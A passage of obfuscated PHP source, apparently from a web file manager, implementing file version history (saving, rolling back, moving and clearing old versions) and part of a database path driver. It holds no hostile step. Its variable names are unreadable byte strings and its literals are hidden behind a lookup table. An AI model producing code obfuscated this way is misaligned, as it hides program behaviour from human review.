Hook::bind($‰¸ôÁ¯«[1321], $‰¸ôÁ¯«[1322]); Hook::bind($‰¸ôÁ¯«[1323], $‰¸ôÁ¯«[1324]); Hook::bind($‰¸ôÁ¯«[1325], $‰¸ôÁ¯«[1326]); Hook::bind($‰¸ôÁ¯«[1327], $‰¸ôÁ¯«[1328]); Hook::bind($‰¸ôÁ¯«[1329], $‰¸ôÁ¯«[1330]); Hook::bind($‰¸ôÁ¯«[1331], $‰¸ôÁ¯«[1332]); } public static function eventBeforeUpload($²£“â©ç) { if ($²£“â©ç[3] && $²£“â©ç[3] != REPEAT_REPLACE) { return; } $††ä€ƒˆ = self::parsePath($²£“â©ç[0]); if (!$††ä€ƒˆ) { return; } self::add($††ä€ƒˆ); } public static function eventBeforeEdit($«ªŞ„¿ß) { $åØ­ = self::parsePath($«ªŞ„¿ß[0]); if (!$åØ­) { return; } self::add($åØ­); } public static function eventBeforeCopyFile($ôÃ¬Š®Æ, $®åĞşäı, $ˆµ²Ã´, $Ø‘§˜æ, $Ïğ¨³²€, $»ÆèĞ“©) { $ˆáÆ¯‚ =& $_SERVER[´‹ô¯Œ]; if (isset($ˆµ²Ã´->_data[$ˆáÆ¯‚[1251]]) && $ˆµ²Ã´->_data[$ˆáÆ¯‚[1251]]) { return; } $†Ã˜“ î = $ˆµ²Ã´->getPathOuter($Ø‘§˜æ); $×¼Ú‹Ô = self::parsePath($†Ã˜“ î); if (!$×¼Ú‹Ô) { return; } self::add($×¼Ú‹Ô); } public static function eventBeforeRename($š³Îµƒà) { $ÖÅ¡‰ü† =& $_SERVER[´‹ô¯Œ]; $Á©ìéû· = self::parsePath($š³Îµƒà[0]); if (!$Á©ìéû·) { return; } $ìîîïÂù = self::checkInHistory($Á©ìéû·); if (!$ìîîïÂù) { return; } if ($ìîîïÂù[$ÖÅ¡‰ü†[33]] == $ÖÅ¡‰ü†[233]) { $èáÑºïÙ = self::listData($Á©ìéû·); if ($èáÑºïÙ && $èáÑºïÙ[$ÖÅ¡‰ü†[448]]) { self::moveHistory($Á©ìéû·, $š³Îµƒà[1]); } } else { IO::rename($ìîîïÂù[$ÖÅ¡‰ü†[87]], $š³Îµƒà[1]); } } public static function eventBeforeMove($ˆ‹äİó) { $çå¹²é© =& $_SERVER[´‹ô¯Œ]; $Éìõ°ÁÕ = self::parsePath($ˆ‹äİó[0]); if (!$Éìõ°ÁÕ) { return; } $è“¼ê£ˆ = self::parsePath($ˆ‹äİó[1]); if (!$è“¼ê£ˆ) { return; } $©ì¾ê¡ = $ˆ‹äİó[3]; $´·¤şç = self::checkInHistory($Éìõ°ÁÕ); if (!$´·¤şç) { return; } $î¾È¨”Õ = self::pathHistory($è“¼ê£ˆ); if ($´·¤şç[$çå¹²é©[33]] == $çå¹²é©[233]) { $úÊ§ø¾Î = self::listData($Éìõ°ÁÕ); $š‹£œÙí = rtrim($è“¼ê£ˆ, $çå¹²é©[8]) . $çå¹²é©[8] . ($©ì¾ê¡ ? $©ì¾ê¡ : get_path_this($Éìõ°ÁÕ)); $ÓÀ—º = self::listData($š‹£œÙí); if ($úÊ§ø¾Î && $úÊ§ø¾Î[$çå¹²é©[448]] && $ÓÀ—º && $ÓÀ—º[$çå¹²é©[448]]) { return self::clear($Éìõ°ÁÕ); } if ($úÊ§ø¾Î && $úÊ§ø¾Î[$çå¹²é©[448]]) { self::moveHistory($Éìõ°ÁÕ, $©ì¾ê¡, $î¾È¨”Õ); } } else { IO::move($´·¤şç[$çå¹²é©[87]], $î¾È¨”Õ, !1, $©ì¾ê¡); self::clearEmptyFolder(IO::pathFather($´·¤şç[$çå¹²é©[87]])); } } public static function eventAfterRemove($¢Üã‹Äû, $ãÓú´¦”) { $ã­¶şÅğ =& $_SERVER[´‹ô¯Œ]; if (!$ãÓú´¦”) { return; } $Æ±Ü¤ı = self::parsePath($¢Üã‹Äû[0]); if (!$Æ±Ü¤ı) { return; } $Â›‹¼¸Ì = self::checkInHistory($Æ±Ü¤ı); if (!$Â›‹¼¸Ì) { return; } if ($Â›‹¼¸Ì[$ã­¶şÅğ[33]] == $ã­¶şÅğ[233]) { $½Á¬Ëœ = self::listData($Æ±Ü¤ı, !1); if ($½Á¬Ëœ && $½Á¬Ëœ[$ã­¶şÅğ[448]]) { self::clear($Æ±Ü¤ı, !1); } } else { IO::remove($Â›‹¼¸Ì[$ã­¶şÅğ[87]]); self::clearEmptyFolder(IO::pathFather($Â›‹¼¸Ì[$ã­¶şÅğ[87]])); } } private static function checkInHistory($øÄ¸Š¹) { $åÒÓŞıÉ = self::pathHistory($øÄ¸Š¹); if (!IO::exist($åÒÓŞıÉ)) { $åÒÓŞıÉ .= $_SERVER[´‹ô¯Œ][1333]; } return IO::exist($åÒÓŞıÉ) ? IO::info($åÒÓŞıÉ) : !1; } private static function parsePath($×Š˜Ğ¡Š) { $”½ Ş =& $_SERVER[´‹ô¯Œ]; if (!$×Š˜Ğ¡Š) { return !1; } if (isset($GLOBALS[$”½ Ş[1334]]) && $GLOBALS[$”½ Ş[1334]]) { return; } $ŞúÏ…— = KodIO::parse($×Š˜Ğ¡Š); $èéË÷ = $ŞúÏ…—[$”½ Ş[33]]; $™ù¦ø‚ = !$èéË÷ || $èéË÷ == KodIO::KOD_IO || $èéË÷ == KodIO::KOD_SHARE_ITEM; if (!$™ù¦ø‚ || !$ŞúÏ…—[$”½ Ş[1335]]) { return !1; } if (substr($×Š˜Ğ¡Š, 0, strlen(DATA_PATH . $”½ Ş[1336])) == DATA_PATH . $”½ Ş[1336]) { return !1; } if ($èéË÷ == KodIO::KOD_SHARE_ITEM) { $ş¹òÚœ¸ = IO::init($×Š˜Ğ¡Š); if ($ş¹òÚœ¸->pathParse[$”½ Ş[1247]]) { return self::parsePath($ş¹òÚœ¸->pathParse[$”½ Ş[1247]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $‰Âæ§Ü¼ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $”½ Ş[1337]); foreach ($‰Âæ§Ü¼ as $æÚªÀåô) { if (!$èéË÷ && substr($×Š˜Ğ¡Š, 0, strlen($æÚªÀåô)) == $æÚªÀåô) { return !1; } } self::log($GLOBALS[$”½ Ş[1242]] . $”½ Ş[1338] . $×Š˜Ğ¡Š); return $×Š˜Ğ¡Š; } private static function pathHistory($ŞÏŠÔ—ë) { $Ö¡™ç‚‚ =& $_SERVER[´‹ô¯Œ]; $Ê€ÊÜóÔ = self::$_historyBase . ltrim(KodIO::clear($ŞÏŠÔ—ë), $Ö¡™ç‚‚[8]); $Ê€ÊÜóÔ = str_replace(array($Ö¡™ç‚‚[1339]), array($Ö¡™ç‚‚[1340]), $Ê€ÊÜóÔ); return $Ê€ÊÜóÔ; } public static function log($ÈÉ·ãŞ¾) { } public static function historyCount($È‰ş½¤ò) { $ì¢ƒğÇ =& $_SERVER[´‹ô¯Œ]; $ïëÛì—À = array(); $ŒÚØ¶ÄŠ = array(); foreach ($È‰ş½¤ò as $¡âÎÚÄÜ) { $·®£†£ƒ = get_path_father($¡âÎÚÄÜ); if (!$ŒÚØ¶ÄŠ[$·®£†£ƒ]) { $ŒÚØ¶ÄŠ[$·®£†£ƒ] = array(); } $ŒÚØ¶ÄŠ[$·®£†£ƒ][] = get_path_this($¡âÎÚÄÜ); } foreach ($ŒÚØ¶ÄŠ as $·®£†£ƒ => $¥¤€Â) { $í©å‚å’ = self::parsePath($·®£†£ƒ); if (!$í©å‚å’) { continue; } foreach ($¥¤€Â as $É §¬›®) { $Ÿ™å·’ = self::listData(rtrim($í©å‚å’, $ì¢ƒğÇ[8]) . $ì¢ƒğÇ[8] . $É §¬›®, !1); if ($Ÿ™å·’ && $Ÿ™å·’[$ì¢ƒğÇ[448]]) { $ïëÛì—À[rtrim($·®£†£ƒ, $ì¢ƒğÇ[8]) . $ì¢ƒğÇ[8] . $É §¬›®] = count($Ÿ™å·’[$ì¢ƒğÇ[448]]); } } } return $ïëÛì—À; } public static function add($Ç©ıØæ) { $ù©õß¬€ =& $_SERVER[´‹ô¯Œ]; $âÉãƒ«À = self::listData($Ç©ıØæ); if (!$âÉãƒ«À) { return; } $Ã®éãËŒ = Model($ù©õß¬€[856])->get($ù©õß¬€[1341]); $…Ãüóğ¾ = intval($GLOBALS[$ù©õß¬€[6]][$ù©õß¬€[92]][$ù©õß¬€[1319]]); $õáîçœÒ = $Ã®éãËŒ == $ù©õß¬€[1342] ? min(5, $…Ãüóğ¾) : $…Ãüóğ¾; if ($…Ãüóğ¾ <= 0) { return; } $¶Õ¼íÃ¿ = IO::info($Ç©ıØæ); $Ç÷ó½ = $âÉãƒ«À[$ù©õß¬€[448]]; if ($¶Õ¼íÃ¿[$ù©õß¬€[79]] == 0) { return; } if ($¶Õ¼íÃ¿[$ù©õß¬€[79]] >= 1024 * 1024 * 500) { return !1; } $›Ä©îÁì = IO::hashSimple($Ç©ıØæ); if ($Ç÷ó½ && $Ç÷ó½[0][$ù©õß¬€[689]] == $›Ä©îÁì) { return !0; } if (array_key_exists($ù©õß¬€[236], $¶Õ¼íÃ¿) && !$¶Õ¼íÃ¿[$ù©õß¬€[236]]) { return !1; } $ÉáÜÒì = short_id(time()); $´Àºğ„· = array($ù©õß¬€[487] => $ÉáÜÒì, $ù©õß¬€[689] => $›Ä©îÁì, $ù©õß¬€[32] => $¶Õ¼íÃ¿[$ù©õß¬€[32]] . $ù©õß¬€[10] . date($ù©õß¬€[1343]) . rand_string(1), $ù©õß¬€[79] => $¶Õ¼íÃ¿[$ù©õß¬€[79]], $ù©õß¬€[539] => USER_ID, $ù©õß¬€[234] => time(), $ù©õß¬€[1344] => $ù©õß¬€[12]); IO::mkdir($âÉãƒ«À[$ù©õß¬€[1345]]); $‰É´¬Éü = IO::copy($Ç©ıØæ, $âÉãƒ«À[$ù©õß¬€[1345]], !1, $´Àºğ„·[$ù©õß¬€[32]]); if (!$‰É´¬Éü) { self::clearEmptyFolder($âÉãƒ«À[$ù©õß¬€[1345]]); return !1; } array_unshift($Ç÷ó½, $´Àºğ„·); if (count($Ç÷ó½) > $õáîçœÒ) { $®½¾¼µ¹ = array_slice($Ç÷ó½, $õáîçœÒ); foreach ($®½¾¼µ¹ as $Ï¹Ñ¡•Ş) { IO::remove($âÉãƒ«À[$ù©õß¬€[1345]] . $Ï¹Ñ¡•Ş[$ù©õß¬€[32]]); } $Ç÷ó½ = array_slice($Ç÷ó½, 0, $õáîçœÒ); } return self::saveData($âÉãƒ«À[$ù©õß¬€[1346]], $Ç÷ó½); } public static function remove($ÇÚ»ëÀ, $±Åî›«¢) { $¶ØˆÊÆ¿ =& $_SERVER[´‹ô¯Œ]; $ÑğÁ²úÄ = self::listData($ÇÚ»ëÀ); $¡â„½ = array(); if (!$ÑğÁ²úÄ) { return !1; } foreach ($ÑğÁ²úÄ[$¶ØˆÊÆ¿[448]] as $ì‚ëºø) { if ($ì‚ëºø[$¶ØˆÊÆ¿[487]] == $±Åî›«¢) { IO::remove($ÑğÁ²úÄ[$¶ØˆÊÆ¿[1345]] . $ì‚ëºø[$¶ØˆÊÆ¿[32]]); continue; } $¡â„½[] = $ì‚ëºø; } return self::saveData($ÑğÁ²úÄ[$¶ØˆÊÆ¿[1346]], $¡â„½); } public static function clear($òç«‡åÌ, $ıÅ„¯“Ê = true) { $ÕŒ£ß³ù =& $_SERVER[´‹ô¯Œ]; $§Ë°ŞÆ = self::listData($òç«‡åÌ, $ıÅ„¯“Ê); if (!$§Ë°ŞÆ) { return !1; } foreach ($§Ë°ŞÆ[$ÕŒ£ß³ù[448]] as $ä÷ª©½œ) { IO::remove($§Ë°ŞÆ[$ÕŒ£ß³ù[1345]] . $ä÷ª©½œ[$ÕŒ£ß³ù[32]]); } return self::saveData($§Ë°ŞÆ[$ÕŒ£ß³ù[1346]], array()); } public static function moveHistory($Õ‰Èêíá, $²ùØıŒ° = '', $˜¾á¡Ÿ¤ = '') { $ûÛÊÓñ =& $_SERVER[´‹ô¯Œ]; $ø‰¼ûÀ = self::listData($Õ‰Èêíá, !1); if (!$ø‰¼ûÀ || !$ø‰¼ûÀ[$ûÛÊÓñ[448]]) { return !1; } $–òı”¡ = $ûÛÊÓñ[1333]; $²ùØıŒ° = $²ùØıŒ° ? $²ùØıŒ° : get_path_this($Õ‰Èêíá); $˜¾á¡Ÿ¤ = $˜¾á¡Ÿ¤ ? $˜¾á¡Ÿ¤ : $ø‰¼ûÀ[$ûÛÊÓñ[1345]]; $àäƒ¦›Ë = substr(get_path_this($ø‰¼ûÀ[$ûÛÊÓñ[1346]]), 0, -strlen($–òı”¡)); foreach ($ø‰¼ûÀ[$ûÛÊÓñ[448]] as $¬‰èØ¥· => $Ü¤îŒ¥ª) { $§¡”Ğ´„ = $²ùØıŒ° . substr($Ü¤îŒ¥ª[$ûÛÊÓñ[32]], strlen($àäƒ¦›Ë)); $Û¯ÁòÙô = IO::move($ø‰¼ûÀ[$ûÛÊÓñ[1345]] . $Ü¤îŒ¥ª[$ûÛÊÓñ[32]], $˜¾á¡Ÿ¤, !1, $§¡”Ğ´„); if ($Û¯ÁòÙô) { $ø‰¼ûÀ[$ûÛÊÓñ[448]][$¬‰èØ¥·][$ûÛÊÓñ[32]] = $§¡”Ğ´„; } } $ø‰¼ûÀ[$ûÛÊÓñ[1346]] = IO::move($ø‰¼ûÀ[$ûÛÊÓñ[1346]], $˜¾á¡Ÿ¤, !1, $²ùØıŒ° . $–òı”¡); self::saveData($ø‰¼ûÀ[$ûÛÊÓñ[1346]], $ø‰¼ûÀ[$ûÛÊÓñ[448]]); self::clearEmptyFolder($ø‰¼ûÀ[$ûÛÊÓñ[1345]]); } public static function rollback($¥öŒ¢óê, $×Öİ¢£õ) { $È¨·Ò£ó =& $_SERVER[´‹ô¯Œ]; $üöø÷ÉÁ = self::listData($¥öŒ¢óê); if (!$üöø÷ÉÁ) { return; } $“¡Î‘ = IO::info($¥öŒ¢óê); foreach ($üöø÷ÉÁ[$È¨·Ò£ó[448]] as $üê»îä• => $ÈáåÎ¬š) { if ($ÈáåÎ¬š[$È¨·Ò£ó[487]] == $×Öİ¢£õ) { self::add($¥öŒ¢óê); $ôŒˆ´ª = $üöø÷ÉÁ[$È¨·Ò£ó[1345]] . $ÈáåÎ¬š[$È¨·Ò£ó[32]]; $’¨Ÿˆ½” = IO::copy($ôŒˆ´ª, IO::pathFather($¥öŒ¢óê), REPEAT_REPLACE, $“¡Î‘[$È¨·Ò£ó[32]]); if ($’¨Ÿˆ½”) { self::remove($¥öŒ¢óê, $×Öİ¢£õ); } return $’¨Ÿˆ½”; } } return !1; } public static function setDetail($“ÓèÒ¨, $Úá†â½Í, $ŒÉÕ®ª) { $²¾ÔÕÅ =& $_SERVER[´‹ô¯Œ]; $¹„ùí‡ = self::listData($“ÓèÒ¨); if (!$¹„ùí‡) { return; } foreach ($¹„ùí‡[$²¾ÔÕÅ[448]] as $Äû‚Ô‘¿ => $¹ƒŠôª¢) { if ($¹ƒŠôª¢[$²¾ÔÕÅ[487]] == $Úá†â½Í) { $¹„ùí‡[$²¾ÔÕÅ[448]][$Äû‚Ô‘¿][$²¾ÔÕÅ[1344]] = $ŒÉÕ®ª; self::saveData($¹„ùí‡[$²¾ÔÕÅ[1346]], $¹„ùí‡[$²¾ÔÕÅ[448]]); return !0; } } return !1; } public static function fileInfo($Œí·íˆ˜, $õÄ´äÂ¼) { $ªı¬°«ø =& $_SERVER[´‹ô¯Œ]; $äÚš ¼ˆ = self::listData($Œí·íˆ˜); if (!$äÚš ¼ˆ) { show_json(LNG($ªı¬°«ø[108]), !1); } $”ñÇ¶ÏÀ = $ªı¬°«ø[12]; foreach ($äÚš ¼ˆ[$ªı¬°«ø[448]] as $ñëà÷˜ø => $ûŠ¢Â‡Í) { if ($ûŠ¢Â‡Í[$ªı¬°«ø[487]] != $õÄ´äÂ¼) { continue; } $”ñÇ¶ÏÀ = $äÚš ¼ˆ[$ªı¬°«ø[1345]] . $ûŠ¢Â‡Í[$ªı¬°«ø[32]]; break; } if (!$”ñÇ¶ÏÀ) { show_json(LNG($ªı¬°«ø[108]), !1); } return IO::info($”ñÇ¶ÏÀ); } public static function fileOut($Ë¤æ³şˆ, $Ïºì–¸ó, $ÈûĞûï¤ = false) { $‰Å•€²Ñ =& $_SERVER[´‹ô¯Œ]; $À©Ğ•¡ø = self::fileInfo($Ë¤æ³şˆ, $Ïºì–¸ó); $¥……œœï =& $GLOBALS[$‰Å•€²Ñ[7]]; $ÈûĞûï¤ = isset($¥……œœï[$‰Å•€²Ñ[1296]]) && $¥……œœï[$‰Å•€²Ñ[1296]] == 1; if (isset($¥……œœï[$‰Å•€²Ñ[33]]) && $¥……œœï[$‰Å•€²Ñ[33]] == $‰Å•€²Ñ[1347]) { return IO::fileOutImage($À©Ğ•¡ø[$‰Å•€²Ñ[87]], $¥……œœï[$‰Å•€²Ñ[1348]]); } IO::fileOut($À©Ğ•¡ø[$‰Å•€²Ñ[87]], $ÈûĞûï¤, get_path_this($Ë¤æ³şˆ)); } public static function listData($˜«¾Ì¤ı, $áËŸÜ–¬ = true) { $Œ¾«Éù =& $_SERVER[´‹ô¯Œ]; if ($áËŸÜ–¬ && !IO::exist($˜«¾Ì¤ı)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($˜«¾Ì¤ı, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Àöğ­ = self::pathHistory($˜«¾Ì¤ı); $°¤†‡Èå = array($Œ¾«Éù[1346] => $Àöğ­ . $Œ¾«Éù[1333], $Œ¾«Éù[1345] => rtrim(get_path_father($Àöğ­), $Œ¾«Éù[8]) . $Œ¾«Éù[8], $Œ¾«Éù[448] => array()); $ÛºòÛ†Å = IO::getContent($°¤†‡Èå[$Œ¾«Éù[1346]]); if ($ÛºòÛ†Å) { $ñ›«§ı÷ = json_decode($ÛºòÛ†Å, !0); if (is_array($ñ›«§ı÷)) { $°¤†‡Èå[$Œ¾«Éù[448]] = $ñ›«§ı÷; } } return $°¤†‡Èå; } private static function saveData($Â›ŸÀ´µ, $ÃÛÉ›ğ´) { $˜”µš†ı =& $_SERVER[´‹ô¯Œ]; self::log($˜”µš†ı[1349] . $Â›ŸÀ´µ . $˜”µš†ı[74] . count($ÃÛÉ›ğ´), $˜”µš†ı[838]); if ($ÃÛÉ›ğ´) { return IO::setContent($Â›ŸÀ´µ, json_encode($ÃÛÉ›ğ´)); } $©ù›®è¦ = IO::pathFather($Â›ŸÀ´µ); IO::remove($Â›ŸÀ´µ); self::clearEmptyFolder($©ù›®è¦); return !0; } public static function clearEmptyFolder($ı®§îÂ´) { $ßëñ× =& $_SERVER[´‹ô¯Œ]; if (trim($ı®§îÂ´, $ßëñ×[8]) == trim(self::$_historyBase, $ßëñ×[8])) { return; } $«€ğØ€ = IO::pathFather($ı®§îÂ´); $¹İ·†ÄÃ = IO::has($ı®§îÂ´, !0); if ($¹İ·†ÄÃ[$ßëñ×[242]] > 0 || $¹İ·†ÄÃ[$ßëñ×[243]] > 0) { return; } IO::remove($ı®§îÂ´); self::clearEmptyFolder($«€ğØ€); } private static function getBasePath() { $»ªåæú‰ =& $_SERVER[´‹ô¯Œ]; $È®›­Ç© = Model($»ªåæú‰[1350])->get($»ªåæú‰[1351]); if ($È®›­Ç©) { if (!IO::exist($È®›­Ç©)) { IO::mkdir($È®›­Ç©); } if (get_path_this($È®›­Ç©) == $»ªåæú‰[1336]) { $Ï Ò³š = $»ªåæú‰[1352] . rand_string(8); @rename($È®›­Ç©, get_path_father($È®›­Ç©) . $»ªåæú‰[8] . $Ï Ò³š); $È®›­Ç© = DATA_PATH . $Ï Ò³š . $»ªåæú‰[8]; file_put_contents(DATA_PATH . $»ªåæú‰[1283], $»ªåæú‰[12]); Model($»ªåæú‰[1350])->set($»ªåæú‰[1351], $È®›­Ç©); } return $È®›­Ç©; } $È®›­Ç© = DATA_PATH . $»ªåæú‰[1352] . rand_string(8) . $»ªåæú‰[8]; $È®›­Ç© = IO::mkdir($È®›­Ç©); $È®›­Ç© = rtrim($È®›­Ç©, $»ªåæú‰[8]) . $»ªåæú‰[8]; file_put_contents($È®›­Ç© . $»ªåæú‰[1283], $»ªåæú‰[12]); file_put_contents(DATA_PATH . $»ªåæú‰[1283], $»ªåæú‰[12]); Model($»ªåæú‰[1350])->set($»ªåæú‰[1351], $È®›­Ç©); return $È®›­Ç©; } } goto a¨ªµ–”˜Í; CäòÆš´©ä: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($‰æí½¼Ş) { $this->pathParse = $‰æí½¼Ş; $this->model = Model($_SERVER[´‹ô¯Œ][1445]); } public function getPath($Ÿú½© ») { return trim($Ÿú½© », $_SERVER[´‹ô¯Œ][8]); } public function pathFather($Â®Šßüâ) { $ğ¢¡‚¤ñ = $this->parse($Â®Šßüâ); $ğ¢¡‚¤ñ = $this->infoSimple($Â®Šßüâ); return $ğ¢¡‚¤ñ ? $ğ¢¡‚¤ñ[$_SERVER[´‹ô¯Œ][193]] : !1; } public function pathThis($‚‹±şĞú) { $Óæä®âï = $this->infoSimple($‚‹±şĞú); return $Óæä®âï ? $Óæä®âï[$_SERVER[´‹ô¯Œ][32]] : !1; } public function getPathOuter($õ•Êœ¿¯) { if (!$õ•Êœ¿¯) { return $õ•Êœ¿¯; } $áğ‰¢Ç£ = $this->parse($õ•Êœ¿¯); return KodIO::make($áğ‰¢Ç£[$_SERVER[´‹ô¯Œ][487]]); } public function copyFolderFromIO($‰®©’ö, $¸ñìÄŠí, $ö‚®½Ä, $ïÙ¿’ßŒ, $¦ÀºÃ©Ã) { $Å·™Ç  = $this->model->copyFolderFromIO($‰®©’ö, $¸ñìÄŠí, $ö‚®½Ä, $ïÙ¿’ßŒ, $¦ÀºÃ©Ã); return KodIO::make($Å·™Ç ); } public function isParentOf($ÇÛ¾×ª, $×±¦ŞÆÆ) { return $this->model->isParentOf($ÇÛ¾×ª, $×±¦ŞÆÆ); } public function mkfile($˜²éòŞ, $©îˆ¬åÑ = '', $˜‡µ½„Ë = REPEAT_RENAME) { $Ïşğ–ĞÑ =& $_SERVER[´‹ô¯Œ]; $—´À×‚µ = $this->parse($˜²éòŞ); $˜²éòŞ = $—´À×‚µ[$Ïşğ–ĞÑ[487]]; for ($§˜ÒşãÑ = 0; $§˜ÒşãÑ < count($—´À×‚µ[$Ïşğ–ĞÑ[1446]]); $§˜ÒşãÑ++) { $¿ïŸä¦Î = $—´À×‚µ[$Ïşğ–ĞÑ[1446]][$§˜ÒşãÑ]; if ($§˜ÒşãÑ == count($—´À×‚µ[$Ïşğ–ĞÑ[1446]]) - 1) { $˜²éòŞ = $this->model->mkfile($˜²éòŞ, $¿ïŸä¦Î, $©îˆ¬åÑ, $˜‡µ½„Ë); break; } $˜²éòŞ = $this->model->mkdir($˜²éòŞ, $¿ïŸä¦Î, REPEAT_SKIP); } return $this->getPathOuter($˜²éòŞ); } public function mkdir($ûõşñˆ÷, $ÔıêŒØÇ = REPEAT_SKIP) { $ì¼ı“Ä– =& $_SERVER[´‹ô¯Œ]; $Û½£¢îŸ = $this->parse($ûõşñˆ÷); $ûõşñˆ÷ = $Û½£¢îŸ[$ì¼ı“Ä–[487]]; for ($‚’òµ‰ = 0; $‚’òµ‰ < count($Û½£¢îŸ[$ì¼ı“Ä–[1446]]); $‚’òµ‰++) { $’¡è©Áª = $Û½£¢îŸ[$ì¼ı“Ä–[1446]][$‚’òµ‰]; $ûõşñˆ÷ = $this->model->mkdir($ûõşñˆ÷, $’¡è©Áª, $ÔıêŒØÇ); } return $this->getPathOuter($ûõşñˆ÷); } public function copyFile($Êòåä, $ôê¦È¤, $Ò’†½Å” = REPEAT_REPLACE) { $ıÖåíü =& $_SERVER[´‹ô¯Œ]; $à€—İë = $this->parse($ôê¦È¤); $Ÿä‡®‡Ä = $this->model->copy($Êòåä, $à€—İë[$ıÖåíü[487]], $Ò’†½Å”, $à€—İë[$ıÖåíü[87]]); return $Ÿä‡®‡Ä ? $this->getPathOuter($Ÿä‡®‡Ä) : !1; } public function moveFile($‡Š¯²»Ê, $¤ú–è¹, $µÉ¨Æ ¾ = REPEAT_REPLACE) { $û €•À =& $_SERVER[´‹ô¯Œ]; $ò± ¦Îö = $this->parse($¤ú–è¹); $ÆŒ¿Û = $this->model->move($‡Š¯²»Ê, $ò± ¦Îö[$û €•À[487]], $µÉ¨Æ ¾, $ò± ¦Îö[$û €•À[87]]); return $ÆŒ¿Û ? $this->getPathOuter($ÆŒ¿Û) : !1; } public function copy($Á¥“§ÈÇ, $ºĞ×§â·, $ŸÌÄãî™ = REPEAT_REPLACE, $Ù¥Å‰âÚ = false) { $¯´äâñŞ = $this->parse($ºĞ×§â·); $·¯¸¤ûñ = $this->model->copy($Á¥“§ÈÇ, $¯´äâñŞ[$_SERVER[´‹ô¯Œ][487]], $ŸÌÄãî™, $Ù¥Å‰âÚ); return $·¯¸¤ûñ ? $this->getPathOuter($·¯¸¤ûñ) : !1; } public function moveSameAllow() { } public function move($”Ğ­, $Ó ¡çå×, $ßÜæÓÍì = REPEAT_REPLACE, $·´ÅÉ¨ = false) { $¬‚»•Ò¶ = $this->parse($Ó ¡çå×); $”£Ö²ä„ = $this->model->move($”Ğ­, $¬‚»•Ò¶[$_SERVER[´‹ô¯Œ][487]], $ßÜæÓÍì, $·´ÅÉ¨); return $”£Ö²ä„ ? $this->getPathOuter($”£Ö²ä„) : !1; } public function remove($¢Ó·ˆòï, $¹ãËõäŒ = true) { return $this->model->remove($¢Ó·ˆòï, $¹ãËõäŒ); } public function rename($§’£ËôÛ, $ùïù¤©) { $öî¾’ = $this->model->rename($§’£ËôÛ, $ùïù¤©); return $öî¾’ ? $this->getPathOuter($§’£ËôÛ) : $öî¾’; } public function size($Õú½‘) { $Ûİ¹Šê™ = $this->infoSimple($Õú½‘); return $Ûİ¹Šê™ ? $Ûİ¹Šê™[$_SERVER[´‹ô¯Œ][79]] : 0; } public function infoSimple($ŒÕéĞ“ƒ) { return $this->model->sourceInfo($ŒÕéĞ“ƒ); } public function info($ğ§Õ‹) { return $this->infoParse($ğ§Õ‹); } public function infoAuth($¡¢Î˜ª•) { return $this->infoParse($¡¢Î˜ª•, !1, !0); } public function infoWithChildren($£ò€•‚Å) { return $this->infoParse($£ò€•‚Å, !0); } protected function infoParse($ÇŸ¨²úõ, $Ã¤ª¼¬æ = false, $°¾èó´ = false) { if (!$Ã¤ª¼¬æ) { return $this->model->pathInfo($ÇŸ¨²úõ, $°¾èó´); } return $this->model->pathInfoMore($ÇŸ¨²úõ); } public function infoFullSimple($´ÂåŸé¶) { $ƒü°ªş =& $_SERVER[´‹ô¯Œ]; $äßòäúú = explode($ƒü°ªş[8], $´ÂåŸé¶); $Ç¸ß± = implode($ƒü°ªş[8], array_splice($äßòäúú, 1)); return $this->model->pathInfoByPath($äßòäúú[0], $Ç¸ß±); } public function infoFull($‘ìŞŞ·‚) { $Å¥À¬• = $this->infoFullSimple($‘ìŞŞ·‚); return is_array($Å¥À¬•) ? $this->model->pathInfo($Å¥À¬•[$_SERVER[´‹ô¯Œ][194]]) : !1; } public function hashSimple($ñš»ôùÂ) { $ÍŠûï£é =& $_SERVER[´‹ô¯Œ]; $ü¬¸îê = $this->infoWithChildren($ñš»ôùÂ); return $ü¬¸îê[$ÍŠûï£é[170]][$ÍŠûï£é[689]]; } public function hashMd5($±€ÖØã¥) { $ˆËÊöè =& $_SERVER[´‹ô¯Œ]; $ë“÷„ = $this->infoWithChildren($±€ÖØã¥); return $ë“÷„[$ˆËÊöè[170]][$ˆËÊöè[561]]; } public function exist($Êí™ëñ) { $ÃÙÒÄÓõ =& $_SERVER[´‹ô¯Œ]; $‰ĞÏ÷Œ = $this->parse($Êí™ëñ); if (!$‰ĞÏ÷Œ[$ÃÙÒÄÓõ[87]]) { return $this->isFile($Êí™ëñ) || $this->isFolder($Êí™ëñ); } $Ïß»Åš– = array($ÃÙÒÄÓõ[489] => $‰ĞÏ÷Œ[$ÃÙÒÄÓõ[487]], $ÃÙÒÄÓõ[32] => $‰ĞÏ÷Œ[$ÃÙÒÄÓõ[87]]); $Ôå÷µüú = $this->model->where($Ïß»Åš–)->find(); return $Ôå÷µüú ? !0 : !1; } public function isFile($¹ïÇ¯›) { $ÇÃ–«† =& $_SERVER[´‹ô¯Œ]; $ŠÄ‹Èüˆ = $this->infoSimple($¹ïÇ¯›); return $ŠÄ‹Èüˆ && $ŠÄ‹Èüˆ[$ÇÃ–«†[497]] == $ÇÃ–«†[231] ? !0 : !1; } public function isFolder($Ô€®‚ì¸) { $—¢§Ã÷¢ =& $_SERVER[´‹ô¯Œ]; $ãõ™û¸£ = $this->infoSimple($Ô€®‚ì¸); return $ãõ™û¸£ && $ãõ™û¸£[$—¢§Ã÷¢[497]] == $—¢§Ã÷¢[91] ? !0 : !1; } public function listPath($¨—­Û…º, $ü›¾öÏ¹ = false) { $Ùñ‰„ı£ =& $_SERVER[´‹ô¯Œ]; if ($¨—­Û…º == $Ùñ‰„ı£[12]) { return !1; } $ĞéôèÌ = array($Ùñ‰„ı£[489] => $¨—­Û…º); if ($ü›¾öÏ¹) { return $this->model->listSource($ĞéôèÌ, -1); } return $this->model->listSource($ĞéôèÌ); } public function has($›ÃæÃŒ¨, $Œ‡şÑÕ› = false, $‡‰”²­ = null) { $Ä±µõ =& $_SERVER[´‹ô¯Œ]; $ëªñéº® = $this->infoWithChildren($›ÃæÃŒ¨); if ($Œ‡şÑÕ›) { return array($Ä±µõ[243] => $ëªñéº®[$Ä±µõ[243]], $Ä±µõ[242] => $ëªñéº®[$Ä±µõ[242]]); } return $‡‰”²­ ? 